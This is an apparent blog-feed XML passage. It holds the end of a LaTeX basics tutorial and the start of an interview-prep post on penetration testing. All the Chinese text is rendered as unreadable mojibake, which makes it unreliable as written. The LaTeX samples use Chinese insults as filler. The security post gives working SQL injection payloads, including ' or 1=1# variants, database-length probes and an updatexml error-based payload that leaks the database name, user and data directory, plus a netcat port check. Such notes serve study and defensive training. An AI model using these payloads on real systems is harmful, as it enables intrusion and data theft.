ï¼ˆç¾å›½é€šç”¨ä¿¡æ¯äº¤æ¢ç ï¼‰ä½¿ç”¨ 0x00â€“0x7F å¯¹æ–‡å­—ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ 7-bitï¼Œè¦†ç›–äº†åŸºæœ¬çš„æ‹‰ä¸å­—æ¯ã€æ•°å­—å’Œç¬¦å·ï¼Œä»¥åŠä¸€äº›ä¸å¯æ‰“å°çš„æ§åˆ¶å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ã€åˆ¶è¡¨ç¬¦ç­‰ï¼‰</li><li>GBKï¼šå¤šå­—èŠ‚ç¼–ç ï¼Œæ”¯æŒæ±‰å­—ï¼Œå‘ä¸‹å…¼å®¹ASCIIç¼–ç </li><li>Unicodeï¼šå¤šå›½å­—ç¬¦çš„é›†åˆï¼Œè¦†ç›–äº†å‡ ä¹å…¨çƒèŒƒå›´å†…çš„è¯­è¨€æ–‡å­—ã€‚UTF-8 æ˜¯ Unicodeçš„ä¸€å¥—ç¼–ç æ–¹æ¡ˆï¼Œä¸€ä¸ªå­—ç¬¦ç”±ä¸€ä¸ªåˆ°å››ä¸ªå­—èŠ‚ç¼–ç ï¼Œå…¶ä¸­å•å­—èŠ‚å­—ç¬¦çš„ç¼–ç ä¸ ASCII ç¼–ç å…¼å®¹ã€‚ç°è¡Œç‰ˆæœ¬çš„ LATEX ä½¿ç”¨ UTF-8 ä½œä¸ºé»˜è®¤ç¼–ç </li></ul><h2 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h2><ul><li>å•ä¸ªç©ºæ ¼é”®å’Œ Tab é”®è¾“å…¥çš„ç©ºç™½å­—ç¬¦è§†ä¸ºâ€œç©ºæ ¼â€</li><li>è¿ç»­çš„è‹¥å¹²ä¸ªç©ºç™½å­—ç¬¦è§†ä¸ºä¸€ä¸ªç©ºæ ¼</li><li>ä¸€è¡Œå¼€å¤´çš„ç©ºæ ¼å¿½ç•¥ä¸è®¡</li><li>è¡Œæœ«çš„æ¢è¡Œç¬¦è§†ä¸ºä¸€ä¸ªç©ºæ ¼</li></ul><h2 id="æ¢è¡Œ"><a href="#æ¢è¡Œ" class="headerlink" title="æ¢è¡Œ"></a>æ¢è¡Œ</h2><ul><li><p><strong>è¿ç»­ä¸¤ä¸ªæ¢è¡Œç¬¦</strong>æ˜¯ç©ºè¡Œ</p></li><li><p>å¤šä¸ªç©ºè¡Œè¢«è§†ä¸ºä¸€ä¸ªç©ºè¡Œ</p></li></ul><p>ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;document&#125;<br>nmsl<br>wdnmd <br>\end&#123;document&#125;<br></code></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nmsl wdnmd</span><br></code></pre></td></tr></table></figure><hr><p>ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;document&#125;<br>nmsl<br><br>wdnmd <br>\end&#123;document&#125;<br></code></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nmsl</span><br><span class="hljs-attribute">wdnmd</span><br></code></pre></td></tr></table></figure><h2 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h2><ul><li><p>æ³¨é‡Šï¼šLATEX ç”¨ % å­—ç¬¦ä½œä¸ºæ³¨é‡Šã€‚åœ¨è¿™ä¸ªå­—ç¬¦ä¹‹åç›´åˆ°è¡Œæœ«ï¼Œæ‰€æœ‰çš„å­—ç¬¦éƒ½è¢«å¿½ç•¥</p></li><li><p>è½¬ä¹‰å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs latex"># $ % &amp; &#123; &#125; _ ^ ~ \<br><br>\# \$ \% \&amp; \&#123; \&#125; \_<br></code></pre></td></tr></table></figure></li><li><p>å¼•å·ï¼š`â€™ æ„æˆä¸€å¯¹å•å¼•å·ï¼Œ``â€æ„æˆä¸€å¯¹åŒå¼•å·</p></li><li><p>çœç•¥å·ï¼š\dots</p></li><li><p>æ¢è¡Œï¼š<code>\\</code>å’Œ<code>\newline</code></p></li></ul><h1 id="ç« èŠ‚"><a href="#ç« èŠ‚" class="headerlink" title="ç« èŠ‚"></a>ç« èŠ‚</h1><ul><li>ç« ï¼š\chapter{âŸ¨titleâŸ©}</li><li>èŠ‚ï¼š\section{âŸ¨titleâŸ©}</li><li>å°èŠ‚ï¼š\subsection{âŸ¨titleâŸ©}</li></ul><p>è¿™äº›å‘½ä»¤ç”Ÿæˆç« èŠ‚æ ‡é¢˜ï¼Œå¹¶èƒ½å¤Ÿè‡ªåŠ¨ç¼–å·</p><h1 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h1><ul><li><a href="https://github.com/ElegantLaTeX/ElegantPaper">GitHub - ElegantLaTeX/ElegantPaper</a></li><li><a href="https://www.overleaf.com/project/644fe1665d3fbf900c3ee827">Overleaf, ElegantLaTeX/ElegantPaper</a></li></ul><h1 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h1><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><p>ä¸€ä»½ä¸å¤ªç®€çŸ­çš„LATEXä»‹ç»</p></li><li><p><a href="https://learnxinyminutes.com/docs/zh-cn/latex-cn/">https://learnxinyminutes.com/docs/zh-cn/latex-cn/</a></p></li><li><p> <a href="https://zhuanlan.zhihu.com/p/36868831">https://zhuanlan.zhihu.com/p/36868831</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeX</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hvvé¢è¯•çŸ¥è¯†ç‚¹æ‰«ç›²</title>
    <link href="/p/e32f19d0/"/>
    <url>/p/e32f19d0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¸—é€æµ‹è¯•æµç¨‹"><a href="#æ¸—é€æµ‹è¯•æµç¨‹" class="headerlink" title="æ¸—é€æµ‹è¯•æµç¨‹"></a>æ¸—é€æµ‹è¯•æµç¨‹</h1><ol><li>ä¿¡æ¯æ”¶é›†ï¼šæ”¶é›†ç›®æ ‡ç«™ç‚¹çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPåœ°å€ã€å­åŸŸåã€Cæ®µã€æ—ç«™ã€æ¡†æ¶ã€æœåŠ¡å™¨ç³»ç»Ÿã€è¯­è¨€ã€ç›®å½•ç»“æ„ã€æ•°æ®åº“ç±»å‹ã€ç«¯å£ã€æ³¨å†Œäººå‘˜ä¿¡æ¯ä»¥åŠé˜²æŠ¤è®¾å¤‡ç­‰æ•°æ®ã€‚</li><li>æ¼æ´å‘ç°ï¼šé€šè¿‡å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡ŒåŠŸèƒ½ç‚¹æµ‹è¯•ï¼ˆä¸Šä¼ ã€è¶Šæƒã€ç›®å½•éå†ã€æ³¨å…¥ã€XSSã€CSRFç­‰ï¼‰ã€åˆ©ç”¨æ¼æ‰«å·¥å…·ï¼ˆå¦‚Nessusã€AWVSï¼‰å’Œæ‰‹å·¥æµ‹è¯•ç³»ç»Ÿæ¼æ´ç­‰æ‰‹æ®µï¼Œæ¥å‘ç°å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚</li><li>æ¼æ´éªŒè¯ï¼šä½¿ç”¨Kaliç­‰é»‘å®¢å·¥å…·ï¼Œåˆ©ç”¨å·²ç»å‘ç°çš„æ¼æ´è¿›è¡Œæ‰‹å·¥éªŒè¯ï¼Œä»¥ç¡®è®¤æ¼æ´æ˜¯å¦ä»ç„¶å­˜åœ¨ä»¥åŠæ¼æ´çš„å±å®³ç¨‹åº¦ã€‚</li><li>å‡ºå…·æŠ¥å‘Šäº¤ä»˜ï¼šåœ¨å®Œæˆæ¼æ´éªŒè¯åï¼Œæ ¹æ®æ¸—é€æµ‹è¯•çš„ç»“æœå’Œä¸¥é‡ç¨‹åº¦ï¼Œå‡ºå…·è¯¦ç»†çš„å®‰å…¨æ¼æ´æŠ¥å‘Šï¼Œæè¿°å‘ç°çš„æ¼æ´åŒ…æ‹¬å¯èƒ½çš„å±å®³ç¨‹åº¦ã€è®¿é—®è·¯å¾„ã€ç¡®è®¤è¿‡ç¨‹ä»¥åŠå»ºè®®ä¿®å¤æªæ–½ç­‰é¡¹ä¿¡æ¯ï¼Œä»¥äº¤ä»˜äºå§”æ‰˜è€…ã€‚</li><li>æ¼æ´å¤æµ‹ï¼šå¯¹ä¿®å¤åçš„æ¼æ´å†æ¬¡è¿›è¡Œæµ‹è¯•ï¼Œä»¥ç¡®è®¤ä¿®å¤æƒ…å†µã€‚</li></ol><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><blockquote><p>å¦‚ä½•ä¿¡æ¯æ”¶é›†ï¼ˆIPã€å­åŸŸåã€Cæ®µã€æ—ç«™ã€æ¡†æ¶ã€æœåŠ¡å™¨ç³»ç»Ÿã€è¯­è¨€ã€ç›®å½•ç»“æ„ã€æ•°æ®åº“ç±»å‹ã€ç«¯å£ã€æ³¨å†Œäººå‘˜ä¿¡æ¯ã€é˜²æŠ¤è®¾å¤‡</p></blockquote><ol><li>Whois æŸ¥è¯¢ï¼šWHOISæŸ¥è¯¢æ˜¯ä¸€ç§ç”¨äºæŸ¥æ‰¾åŸŸåã€IPåœ°å€ä»¥åŠåŸŸåæ³¨å†Œäººä¿¡æ¯çš„ç½‘ç»œåè®®ã€‚å¯ä»¥é€šè¿‡WHOISæŸ¥è¯¢è·å–åˆ°åŸŸåæ³¨å†Œäººçš„è”ç³»ä¿¡æ¯ã€DNSæœåŠ¡å™¨ã€åŸŸåè¿‡æœŸæ—¶é—´ç­‰ä¿¡æ¯ã€‚</li><li>å­åŸŸåæšä¸¾ï¼šä½¿ç”¨å­åŸŸåçˆ†ç ´å·¥å…·ï¼ˆå¦‚ subdomain-findï¼‰ï¼Œæšä¸¾å‡ºç›®æ ‡ç³»ç»Ÿçš„å­åŸŸåï¼ˆä¾‹å¦‚blog.example.comã€mail.example.comç­‰ï¼‰ä»¥åŠä¸ç›®æ ‡å…¬å¸æœ‰å…³ç³»çš„å…¶ä»–åŸŸåã€‚</li><li>Cæ®µæ‰«æï¼šå¯¹IPåœ°å€æ‰€å¤„çš„Cæ®µå†…çš„æ‰€æœ‰ä¸»æœºè¿›è¡Œæ‰«æï¼Œäº†è§£å…¶ä»–æ½œåœ¨çš„æœåŠ¡å™¨æˆ–è€…ç³»ç»Ÿã€‚<ol><li>Cæ®µæ‰«æé€šå¸¸æ˜¯æŒ‡å¯¹ç›®æ ‡ IP åœ°å€æ‰€åœ¨çš„æ•´ä¸ª C ç±»ç½‘ç»œåœ°å€æ®µè¿›è¡Œæ‰«æçš„è¿‡ç¨‹ï¼Œå‘ç°åŒä¸€ç½‘ç»œå†…çš„å…¶ä»–ä¸»æœºä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç›®æ ‡ IP åœ°å€æ˜¯ 192.168.1.100ï¼Œé‚£ä¹ˆå…¶æ‰€åœ¨çš„ C ç±»ç½‘ç»œåœ°å€æ®µæ˜¯ 192.168.1.0/24ï¼ŒCæ®µæ‰«æå°±æ˜¯åœ¨è¯¥ç½‘ç»œæ®µå†…å¯¹ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€æœåŠ¡æ¢æµ‹ç­‰å®‰å…¨æµ‹è¯•ã€‚</li><li>Cæ®µæ‰«æé€šå¸¸æ˜¯æ¸—é€æµ‹è¯•çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå‘ç°ä¸ç›®æ ‡ä½äºåŒä¸€ç½‘ç»œæ®µå†…çš„å…¶ä»–ä¸»æœºä¿¡æ¯ï¼Œä»è€Œå¸®åŠ©æµ‹è¯•äººå‘˜ identifly å®‰å…¨é£é™©å’Œå¼±ç‚¹ã€‚</li></ol></li><li>æ—ç«™æ¢æµ‹ï¼šé€šè¿‡æ—ç«™åˆ†æå·¥å…·ï¼ˆä¾‹å¦‚webbyã€bebopç­‰ï¼‰ï¼ŒæŸ¥æ‰¾ä¸ç›®æ ‡ç³»ç»Ÿç›¸å…³çš„å…¶ä»–ç½‘ç«™ã€‚</li><li>æ¡†æ¶è¯†åˆ«ï¼šè¯†åˆ«ç›®æ ‡ç½‘ç«™æ‰€ä½¿ç”¨çš„ CMS ç³»ç»Ÿå’Œæ¡†æ¶ï¼Œä¾‹å¦‚ WordPressã€Joomlaã€Drupal ç­‰ï¼Œä»è€Œäº†è§£å¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚<ol><li>WordPressã€Joomla ç­‰ CMS ç³»ç»Ÿé€šå¸¸åœ¨ head æ ‡ç­¾ä¸­æ·»åŠ  generator æ ‡è®°ï¼›</li><li>Bootstrapã€jQuery ç­‰å¸¸ç”¨çš„å‰ç«¯åº“å’Œæ¡†æ¶ä¹Ÿå¸¸å¸¸åœ¨ä»£ç ä¸­æ·»åŠ ç‰ˆæœ¬ä¿¡æ¯å’Œå…¶ä»–ç‰¹å®šæ ‡è¯†ã€‚</li></ol></li><li>æœåŠ¡å™¨è¯†åˆ«ï¼šä½¿ç”¨å·¥å…·ï¼ˆå¦‚ Nmap ç­‰ï¼‰å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œç«¯å£æ‰«æï¼Œä»è€Œå‘ç°ç³»ç»Ÿä¸­çš„è¿è¡ŒæœåŠ¡ã€æ“ä½œç³»ç»Ÿä»¥åŠç«¯å£ä¿¡æ¯ã€‚</li><li>è¯­è¨€ç‰ˆæœ¬è¯†åˆ«ï¼šä½¿ç”¨å·¥å…·ï¼ˆå¦‚ Wappalyzer ç­‰ï¼‰è¯†åˆ«ç½‘ç«™æ‰€ä½¿ç”¨çš„è¯­è¨€ç‰ˆæœ¬ï¼ˆå¦‚ PHPã€ASP.NETã€Java ç­‰ï¼‰ï¼Œä»¥ä¾¿äº†è§£æˆåŠŸæ”»å‡»ç½‘ç«™çš„å¯èƒ½æ€§ã€‚</li><li>ç›®å½•ç»“æ„æ¢æµ‹ï¼šä½¿ç”¨ç›®å½•æ‰«æå·¥å…·ï¼ˆå¦‚ DirBusterã€Gobuster ç­‰ï¼‰æ‰«æç›®æ ‡ä¸»æœºçš„ç›®å½•ç»“æ„ï¼Œå‘ç°å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿç›®å½•ä»¥åŠå¯èƒ½å­˜åœ¨çš„æ¼æ´ç‚¹ã€‚</li><li>æ•°æ®åº“ç±»å‹æ¢æµ‹ï¼šé€šè¿‡åˆ†æé¡µé¢è¿”å›çš„é”™è¯¯ä¿¡æ¯å’Œ HTTP å¤´ä¿¡æ¯ï¼Œè¯†åˆ«ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹ã€‚<ol><li>ç«¯å£æ‰«æï¼šé€šè¿‡æ‰«æç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œå¯ä»¥æ˜ å°„ä¸åŒçš„ç«¯å£å’ŒæœåŠ¡ç±»å‹ï¼Œæ¨æ–­å‡ºç›®æ ‡æ•°æ®åº“æ‰€ä½¿ç”¨çš„ç±»å‹ï¼ˆæ¯”å¦‚mysqlæ˜¯3306ï¼‰ã€‚</li></ol></li><li>ç«¯å£è¯†åˆ«ï¼šä½¿ç”¨ç«¯å£æ‰«æå·¥å…·å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æï¼Œè¯†åˆ«ä¸»æœºæ‰€å¼€æ”¾çš„ç«¯å£ä¿¡æ¯ï¼Œä»¥ä¾¿äº†è§£ç›®æ ‡ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„æ¼æ´ç‚¹ã€‚<ol><li>nc -vz <a href="www.baidu.com">www.baidu.com</a> 80</li></ol></li><li>æ³¨å†Œäººå‘˜ä¿¡æ¯æ”¶é›†ï¼šæŸ¥è¯¢ç›®æ ‡å…¬å¸æ³¨å†Œçš„ä¿¡æ¯ï¼Œä¾‹å¦‚åŸŸåæ³¨å†Œäººä¿¡æ¯ã€ICPå¤‡æ¡ˆä¿¡æ¯ï¼Œä»ä¸­è€ƒå¯Ÿç›¸å…³äººå‘˜çš„è”ç³»æ–¹å¼ç­‰ã€‚</li><li>é˜²æŠ¤è®¾å¤‡è¯†åˆ«ï¼šé€šè¿‡å„ç§æ‰‹æ®µæ”¶é›†ç›®æ ‡ç³»ç»Ÿæ¥å…¥çš„å®‰å…¨è®¾å¤‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬é˜²ç«å¢™ã€WAFï¼ˆWeb åº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼‰ç­‰ï¼Œä»¥ä¾¿äºç»•è¿‡å…¶ä¿æŠ¤æœºåˆ¶ï¼Œå®ç°æ›´é«˜æ•ˆçš„æ¸—é€æ”»å‡»ã€‚</li></ol><h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="åŸºæœ¬æŠ€å·§"><a href="#åŸºæœ¬æŠ€å·§" class="headerlink" title="åŸºæœ¬æŠ€å·§"></a>åŸºæœ¬æŠ€å·§</h2><ul><li>çŒœåˆ—æ•°ï¼šorder by 1 è¡¨ç¤ºæŒ‰ç…§ç¬¬ä¸€åˆ—æ’åºï¼Œè¿™æ ·å¯ä»¥çŒœæµ‹åˆ—æœ‰å‡ ä¸ªåˆ—ã€‚<ul><li>å‡è®¾<code>order by 3#</code>æ—¶ï¼Œè¿”å›é”™è¯¯é‚£ä¹ˆè¯´æ˜åªæœ‰ä¸¤åˆ—</li></ul></li><li>çŒœæ•°æ®åº“åç§°é•¿åº¦<ul><li>1â€™ and length(database())=3 # è‹¥è¿™ä¸ªé”™è¯¯ä¸‹é¢æ­£å¸¸é‚£ä¹ˆæ•°æ®åº“åç§°é•¿åº¦ä¸º4</li><li>1â€™ and length(database())=4 #</li></ul></li><li>è”åˆæŸ¥è¯¢<ul><li>ä½¿ç”¨ union æŸ¥è¯¢çš„æ—¶å€™éœ€è¦å’Œä¸»æŸ¥è¯¢çš„åˆ—æ•°ç›¸åŒ</li><li>Select * From ç”¨æˆ·è¡¨ Where UserName=xxx and Password=xxx or 1=1â€“</li></ul></li><li>å¦‚æœæ˜¯æ•°å­—å‹çš„æ³¨å…¥ï¼Œé‚£ä¹ˆå°±ä¸ç”¨å»é—­åˆå•å¼•å·</li></ul><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><p>æ ¹æ®æäº¤æ–¹å¼ã€æ³¨å…¥ç‚¹å’Œè¿è¡Œç»“æœçš„ä¸åŒï¼ŒSQLæ³¨å…¥å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ol><li>GETå‹æ³¨å…¥ï¼šé€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚ä¸­çš„URLå‚æ•°æ¥å®ç°æ³¨å…¥æ”»å‡»ï¼Œä¾‹å¦‚ï¼š<a href="http://example.com/?id=1&#39;">http://example.com/?id=1&#39;</a> or 1=1#ã€‚</li><li>POSTå‹æ³¨å…¥ï¼šé€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚ä½“ä¸­çš„è¡¨å•æ•°æ®æ¥å®ç°æ³¨å…¥æ”»å‡»ï¼Œä¾‹å¦‚ï¼šPOST /login HTTP/1.1ï¼Œæ•°æ®ä½“ä¸ºï¼šusername=admin&amp;password=123â€™ or 1=1#ã€‚</li><li>Cookieå‹æ³¨å…¥ï¼šé€šè¿‡ä¿®æ”¹æµè§ˆå™¨çš„Cookieå€¼æ¥å®ç°æ³¨å…¥æ”»å‡»ï¼Œä¾‹å¦‚ï¼šCookie: username=admin; password=123â€™ or 1=1#ã€‚</li></ol><ol><li>æ•°å­—å‹æ³¨å…¥ï¼šé’ˆå¯¹æ•°å­—ç±»å‹çš„æ³¨å…¥ç‚¹è¿›è¡Œæ”»å‡»ï¼Œä¾‹å¦‚ï¼šSELECT * FROM users WHERE id=1ï¼Œæ”»å‡»è€…å¯é€šè¿‡ä¿®æ”¹id=1ä¸ºid=1 or 1=1æ¥å®ç°æ³¨å…¥æ”»å‡»ã€‚</li><li>å­—ç¬¦ä¸²å‹æ³¨å…¥ï¼šé’ˆå¯¹å­—ç¬¦ä¸²ç±»å‹çš„æ³¨å…¥ç‚¹è¿›è¡Œæ”»å‡»ï¼Œä¾‹å¦‚ï¼šSELECT * FROM users WHERE name=â€™Tomâ€™ï¼Œæ”»å‡»è€…å¯é€šè¿‡ä¿®æ”¹name=â€™Tomâ€™ä¸ºname=â€™Tomâ€™ or â€˜1â€™=â€™1æ¥å®ç°æ³¨å…¥æ”»å‡»ã€‚</li></ol><ol><li>æœç´¢å‹æ³¨å…¥ï¼šé’ˆå¯¹æœç´¢åŠŸèƒ½è¿›è¡Œæ”»å‡»ï¼Œä¾‹å¦‚ï¼šSELECT * FROM products WHERE name LIKE â€˜%apple%â€™ï¼Œæ”»å‡»è€…å¯é€šè¿‡æœç´¢æ¡†è¾“å…¥%apple%â€™ or 1=1#æ¥å®ç°æ³¨å…¥æ”»å‡»ã€‚</li><li>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼šæ”»å‡»è€…æ— æ³•ç›´æ¥è·å–æ³¨å…¥ç»“æœï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å»¶é•¿SQLæŸ¥è¯¢æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸæ³¨å…¥ã€‚</li><li>åŸºäºæŠ¥é”™çš„æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„SQLè¯­å¥ï¼Œè§¦å‘æœåŠ¡å™¨çš„æŠ¥é”™ä¿¡æ¯ï¼Œä»è€Œè·å–æ•æ„Ÿæ•°æ®ã€‚</li><li>åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼šæ”»å‡»è€…æ— æ³•ç›´æ¥è·å–æ³¨å…¥ç»“æœï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ æ¶æ„SQLè¯­å¥ï¼Œæ ¹æ®è¿”å›ç»“æœçš„çœŸå‡å€¼æ¥æ¨æ–­æ˜¯å¦æˆåŠŸæ³¨å…¥ã€‚</li><li>åŸºäºæ•°å­—çš„æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„SQLè¯­å¥ï¼Œå°†æ³¨å…¥ç»“æœè½¬åŒ–ä¸ºæ•°å­—è¾“å‡ºï¼Œä¾‹å¦‚è®¡ç®—è¯¥è¡¨ä¸­çš„è¡Œæ•°ã€æ±‚å’Œç­‰æ“ä½œã€‚</li></ol><h2 id="åŸºäºæŠ¥é”™çš„æ³¨å…¥"><a href="#åŸºäºæŠ¥é”™çš„æ³¨å…¥" class="headerlink" title="åŸºäºæŠ¥é”™çš„æ³¨å…¥"></a>åŸºäºæŠ¥é”™çš„æ³¨å…¥</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">updatexmlï¼ˆXML_documentï¼ŒXPath_stringï¼Œ<span class="hljs-keyword">new</span><span class="hljs-type">_value</span>ï¼‰<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<span class="hljs-keyword">String</span>æ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXpathæ ¼å¼çš„å­—ç¬¦ä¸²)<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š<span class="hljs-keyword">String</span>æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br><br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼<br></code></pre></td></tr></table></figure><p>æ³¨å…¥ç¤ºä¾‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,@@datadir),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><ul><li>concat(0x7e,database(),0x7e,user(),0x7e,@@datadir)ä¸­é—´æ˜¯æ³¨å…¥çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œä¼šçˆ†å‡ºæ•°æ®åº“ã€ç”¨æˆ·ä¿¡æ¯ã€ç›®å½•</li><li>0x7e æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œè¡¨ç¤ºæ³¢æµªå·å­—ç¬¦ â€œ~â€ï¼Œç”¨äºåˆ†éš”è¦æ³¨å…¥çš„æ•°æ®ã€‚ä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤<strong>æŠ¥å‡ºxpathè¯­æ³•é”™è¯¯</strong></li></ul><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><blockquote><p>SQL ç›²æ³¨æ˜¯åœ¨SQLæ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å…³é—­äº†é”™è¯¯å›æ˜¾ï¼Œæˆ‘ä»¬å•çº¯é€šè¿‡æœåŠ¡å™¨è¿”å›å†…å®¹çš„å˜åŒ–æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥å’Œåˆ©ç”¨çš„æ–¹å¼</p><p>ç›²æ³¨çš„æ‰‹æ®µæœ‰ä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡é¡µé¢çš„è¿”å›å†…å®¹æ˜¯å¦æ­£ç¡®(boolean-based)ï¼Œæ¥éªŒè¯æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚ä¸€ä¸ªæ˜¯é€šè¿‡sqlè¯­å¥å¤„ç†æ—¶é—´çš„ä¸åŒæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥(time-based)ï¼Œåœ¨è¿™é‡Œï¼Œå¯ä»¥ç”¨benchmarkï¼Œsleepç­‰é€ æˆå»¶æ—¶æ•ˆæœçš„å‡½æ•°</p></blockquote><p>ç›²æ³¨æ”»å‡»æ”»å‡»è€…æ— æ³•ä»åº”ç”¨ç¨‹åºçš„å“åº”ä¸­ç›´æ¥è·å–æœ‰å…³æ•°æ®åº“ç»“æ„ã€è¡¨åã€åˆ—åå’Œæ•°æ®ç­‰æ•æ„Ÿä¿¡æ¯ã€‚åº”ç”¨ç¨‹åºä»…ä»…è¿”å›<code>True</code>ï¼ˆé¡µé¢ï¼‰å’Œ<code>False</code>ï¼ˆé¡µé¢ï¼‰ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬æ— æ³•æ ¹æ®åº”ç”¨ç¨‹åºçš„è¿”å›é¡µé¢å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æ•°æ®åº“ä¿¡æ¯ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ é€»è¾‘åˆ¤æ–­ï¼ˆæ¯”è¾ƒå¤§å°ï¼‰æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚</p><p>æ”»å‡»è€…å¯ä»¥åœ¨åº”ç”¨ç¨‹åºçš„è¾“å…¥å­—æ®µä¸­æ³¨å…¥åµŒå¥—çš„æŸ¥è¯¢å‘½ä»¤æˆ–è€…å»¶è¿Ÿå‡½æ•°ï¼Œä¾‹å¦‚ <code>SELECT 